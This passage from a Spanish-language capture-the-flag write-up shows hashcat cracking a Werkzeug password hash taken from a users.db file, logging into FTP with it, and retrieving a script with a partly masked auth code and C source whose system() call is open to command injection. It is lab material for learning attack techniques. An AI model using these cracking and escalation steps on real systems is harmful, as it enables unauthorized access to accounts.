+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>__pycache__  report.py  report_utils.py  reports.db  reports.sql</span></span></code></pre></div>
+<p>Por lo cual, para acceder a los usuarios de la plataforma (recordemos que había una sección de autenticación) simplemente tenemos que acceder al archivo <code>.db</code> correspondiente.</p>
+<h2 id="crackeando-el-hash-de-adam">Crackeando el hash de <code>adam</code></h2>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>dev_acc@intuition:/var/www/app/blueprints/auth$ ls -la
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>total <span style="color:#ff0;font-weight:bold">40</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>drwxr-xr-x <span style="color:#ff0;font-weight:bold">3</span> root root  <span style="color:#ff0;font-weight:bold">4096</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 16:30 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>drwxr-xr-x <span style="color:#ff0;font-weight:bold">6</span> root root  <span style="color:#ff0;font-weight:bold">4096</span> Apr <span style="color:#ff0;font-weight:bold">10</span> 08:21 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>drwxr-xr-x <span style="color:#ff0;font-weight:bold">2</span> root root  <span style="color:#ff0;font-weight:bold">4096</span> Apr <span style="color:#ff0;font-weight:bold">10</span> 08:21 __pycache__
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>-rw-r--r-- <span style="color:#ff0;font-weight:bold">1</span> root root  <span style="color:#ff0;font-weight:bold">1842</span> Sep <span style="color:#ff0;font-weight:bold">18</span>  <span style="color:#ff0;font-weight:bold">2023</span> auth.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>-rw-r--r-- <span style="color:#ff0;font-weight:bold">1</span> root root  <span style="color:#ff0;font-weight:bold">3038</span> Sep <span style="color:#ff0;font-weight:bold">19</span>  <span style="color:#ff0;font-weight:bold">2023</span> auth_utils.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>-rw-r--r-- <span style="color:#ff0;font-weight:bold">1</span> root root <span style="color:#ff0;font-weight:bold">16384</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 16:30 users.db
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>-rw-r--r-- <span style="color:#ff0;font-weight:bold">1</span> root root   <span style="color:#ff0;font-weight:bold">171</span> Sep <span style="color:#ff0;font-weight:bold">18</span>  <span style="color:#ff0;font-weight:bold">2023</span> users.sql</span></span></code></pre></div>
+<p>Vemos al usuario <code>adam</code> y <code>admin</code> y un hash sha256.
+<img src="images/Screenshot_20.png" alt="Write-up Image"></p>
+<p>Este hash lo podemos identificar y crackear con el modo autodetect de <code>hashcat</code>.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\Users\pc\Desktop\hashcat-6.2.6<span style="color:#007f7f">&gt;.\hashcat.exe  .\hash.txt .\rockyou.txt</span></span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Hash.Mode........: 30120 (Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)))
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>Hash.Target......: sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc...89fc43
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#fff;font-weight:bold">Time</span>.Started.....: Mon Jul 29 18:46:39 2024 (2 secs)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#fff;font-weight:bold">Time</span>.Estimated...: Mon Jul 29 18:46:41 2024 (0 secs)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>Guess.Base.......: File (.\rockyou.txt)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>Guess.Queue......: 1/1 (100.00%)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>Speed.#1.........:  6201.3 kH/s (12.48ms) @ Accel:256 Loops:1 Thr:64 Vec:1</span></span></code></pre></div>
+<p>Pero esta no es la contraseña para el usuario <code>adam</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>dev_acc@intuition:/var/www/app/blueprints/auth$ su adam
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>su: Authentication failure</span></span></code></pre></div>
+<p>Así que vamos a intentar enumerar el FTP ya que antes hemos visto que estaba abierto.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>dev_acc@intuition:/var/www/app/blueprints/auth$ ftp adam@127.0.01
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Connected to 127.0.01.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#ff0;font-weight:bold">220</span> pyftpdlib 1.5.7 ready.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#ff0;font-weight:bold">331</span> Username ok, send password.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#ff0;font-weight:bold">230</span> Login successful.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>Remote system <span style="color:#fff;font-weight:bold">type</span> is UNIX.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>Using binary mode to transfer files.</span></span></code></pre></div>
+<p>Dentro del FTP, en <code>/backup/runner1</code> nos encontramos los siguientes ficheros.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#ff0;font-weight:bold">150</span> File status okay. About to open data connection.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>-rwxr-xr-x   <span style="color:#ff0;font-weight:bold">1</span> root     <span style="color:#ff0;font-weight:bold">1002</span>          <span style="color:#ff0;font-weight:bold">318</span> Apr <span style="color:#ff0;font-weight:bold">06</span> 00:25 run-tests.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>-rwxr-xr-x   <span style="color:#ff0;font-weight:bold">1</span> root     <span style="color:#ff0;font-weight:bold">1002</span>        <span style="color:#ff0;font-weight:bold">16744</span> Oct <span style="color:#ff0;font-weight:bold">19</span>  <span style="color:#ff0;font-weight:bold">2023</span> runner1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>-rw-r--r--   <span style="color:#ff0;font-weight:bold">1</span> root     <span style="color:#ff0;font-weight:bold">1002</span>         <span style="color:#ff0;font-weight:bold">3815</span> Oct <span style="color:#ff0;font-weight:bold">19</span>  <span style="color:#ff0;font-weight:bold">2023</span> runner1.c</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#007f7f"># run-tests.sh</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#007f7f">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#007f7f"># List playbooks</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>./runner1 list
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#007f7f"># Run playbooks [Need authentication]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#007f7f"># ./runner run [playbook number] -a [auth code]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#007f7f">#./runner1 run 1 -a &#34;UHI75GHI****&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#007f7f"># Install roles [Need authentication]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#007f7f"># ./runner install [role url] -a [auth code]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#007f7f">#./runner1 install http://role.host.tld/role.tar -a &#34;UHI75GHI****&#34;</span></span></span></code></pre></div>
+<p>Aquí podemos ver que se utiliza un tipo de código de autenticación el cual podemos ver entero excepto 4 carácteres.</p>
+<p>El binario runner1 suponemos que es el archivo runner1.c compilado, vamos a echarle un vistazo.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1</span><span><span style="color:#007f7f">// runner1.c
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2</span><span><span style="color:#007f7f">// Version : 1
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3</span><span><span style="color:#007f7f"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4</span><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5</span><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#0f0;font-weight:bold">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6</span><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;string.h&gt;</span><span style="color:#0f0;font-weight:bold">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7</span><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;dirent.h&gt;</span><span style="color:#0f0;font-weight:bold">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8</span><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;openssl/md5.h&gt;</span><span style="color:#0f0;font-weight:bold">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9</span><span><span style="color:#0f0;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10</span><span><span style="color:#0f0;font-weight:bold">#define INVENTORY_FILE &#34;/opt/playbooks/inventory.ini&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11</span><span><span style="color:#0f0;font-weight:bold">#define PLAYBOOK_LOCATION &#34;/opt/playbooks/&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12</span><span><span style="color:#0f0;font-weight:bold">#define ANSIBLE_PLAYBOOK_BIN &#34;/usr/bin/ansible-playbook&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13</span><span><span style="color:#0f0;font-weight:bold">#define ANSIBLE_GALAXY_BIN &#34;/usr/bin/ansible-galaxy&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14</span><span><span style="color:#0f0;font-weight:bold">#define AUTH_KEY_HASH &#34;0feda17076d793c2ef2870d7427ad4ed&#34;
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15</span><span><span style="color:#0f0;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16</span><span><span style="color:#fff;font-weight:bold">int</span> check_auth(<span style="color:#fff;font-weight:bold">const</span> <span style="color:#fff;font-weight:bold">char</span>* auth_key) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17</span><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> digest[MD5_DIGEST_LENGTH];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18</span><span>    MD5((<span style="color:#fff;font-weight:bold">const</span> <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>*)auth_key, strlen(auth_key), digest);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20</span><span>    <span style="color:#fff;font-weight:bold">char</span> md5_str[<span style="color:#ff0;font-weight:bold">33</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21</span><span>    <span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; <span style="color:#ff0;font-weight:bold">16</span>; i++) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22</span><span>        sprintf(&amp;md5_str[i*<span style="color:#ff0;font-weight:bold">2</span>], <span style="color:#0ff;font-weight:bold">&#34;%02x&#34;</span>, (<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>)digest[i]);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25</span><span>    <span style="color:#fff;font-weight:bold">if</span> (strcmp(md5_str, AUTH_KEY_HASH) == <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26</span><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27</span><span>    } <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28</span><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32</span><span><span style="color:#fff;font-weight:bold">void</span> listPlaybooks() {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33</span><span>    DIR *dir = opendir(PLAYBOOK_LOCATION);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34</span><span>    <span style="color:#fff;font-weight:bold">if</span> (dir == <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35</span><span>        perror(<span style="color:#0ff;font-weight:bold">&#34;Failed to open the playbook directory&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36</span><span>        <span style="color:#fff;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39</span><span>    <span style="color:#fff;font-weight:bold">struct</span> dirent *entry;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40</span><span>    <span style="color:#fff;font-weight:bold">int</span> playbookNumber = <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42</span><span>    <span style="color:#fff;font-weight:bold">while</span> ((entry = readdir(dir)) != <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43</span><span>        <span style="color:#fff;font-weight:bold">if</span> (entry-&gt;d_type == DT_REG &amp;&amp; strstr(entry-&gt;d_name, <span style="color:#0ff;font-weight:bold">&#34;.yml&#34;</span>) != <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44</span><span>            printf(<span style="color:#0ff;font-weight:bold">&#34;%d: %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, playbookNumber, entry-&gt;d_name);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45</span><span>            playbookNumber++;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49</span><span>    closedir(dir);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52</span><span><span style="color:#fff;font-weight:bold">void</span> runPlaybook(<span style="color:#fff;font-weight:bold">const</span> <span style="color:#fff;font-weight:bold">char</span> *playbookName) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53</span><span>    <span style="color:#fff;font-weight:bold">char</span> run_command[<span style="color:#ff0;font-weight:bold">1024</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54</span><span>    snprintf(run_command, <span style="color:#fff;font-weight:bold">sizeof</span>(run_command), <span style="color:#0ff;font-weight:bold">&#34;%s -i %s %s%s&#34;</span>, ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55</span><span>    system(run_command);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57</span><span>
